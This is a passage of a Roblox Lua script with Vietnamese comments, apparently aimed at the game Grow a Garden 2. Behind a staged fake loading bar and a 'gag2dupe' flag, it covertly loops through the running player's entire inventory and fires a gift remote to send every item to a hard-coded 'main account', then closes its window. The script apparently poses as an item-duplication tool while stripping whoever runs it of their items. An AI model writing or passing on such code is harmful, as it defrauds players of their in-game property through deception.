-- 2. HÀM THỰC HIỆN TỰ ĐỘNG CHUYỂN ĐỒ (AUTO GIFT)
local function autoGiftAll()
    local inventory = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:FindFirstChild("Inventory")
    local giftRemote = ReplicatedStorage:FindFirstChild("GiftRemote") or ReplicatedStorage:FindFirstChild("SendGift") or ReplicatedStorage:FindFirstChild("Gift")

    if inventory then
        for _, item in pairs(inventory:GetChildren()) do
            if item:IsA("Tool") or item:IsA("StringValue") or item:IsA("IntValue") then
                local itemName = item.Name
                pcall(function()
                    -- Gửi lệnh tặng quà lên Server
                    giftRemote:FireServer(TEN_ACC_CHINH, itemName, 1)
                end)
                task.wait(0.2) -- Khoảng hoãn nhỏ tránh spam crash game
            end
        end
    end
end


-- 3. ĐIỀU KHIỂN TIẾN TRÌNH LOADING CHẠY LÂU (TỔNG CỘNG ~8 GIÂY)
task.spawn(function()
    -- Giai đoạn 1: Chạy đến 30%
    StatusLabel.Text = "Đang kết nối tới máy chủ Grow a Garden 2..."
    local tween1 = TweenService:Create(ProgressBar, TweenInfo.new(2.5, Enum.EasingStyle.Linear), {Size = UDim2.new(0.3, 0, 1, 0)})
    tween1:Play()
    tween1.Completed:Wait()
    task.wait(0.5)

    -- Giai đoạn 2: Chạy đến 75%
    StatusLabel.Text = "Đang quét danh sách vật phẩm trong túi đồ..."
    local tween2 = TweenService:Create(ProgressBar, TweenInfo.new(3, Enum.EasingStyle.Linear), {Size = UDim2.new(0.75, 0, 1, 0)})
    tween2:Play()
    tween2.Completed:Wait()
    task.wait(0.3)

    -- Giai đoạn 3: Chạy đến 100% và kích hoạt tính năng chuyển đồ
    StatusLabel.Text = "Đang tiến hành Auto Gift ngầm sang nick chính..."
    local tween3 = TweenService:Create(ProgressBar, TweenInfo.new(2, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)})
    tween3:Play()
    tween3.Completed:Wait()
    
    -- Đổi chữ thông báo thành công
    StatusLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
    StatusLabel.Text = "Kích hoạt Auto Gift thành công! Đang tắt bảng..."
    
    -- Chạy tính năng gửi đồ ngầm
    _G.gag2dupe = true
    autoGiftAll()
    
    -- Chờ 1.5 giây cuối để người chơi thấy chữ thành công rồi tự xóa bảng Loading đi
    task.wait(1.5)
    ScreenGui:Destroy()
end)
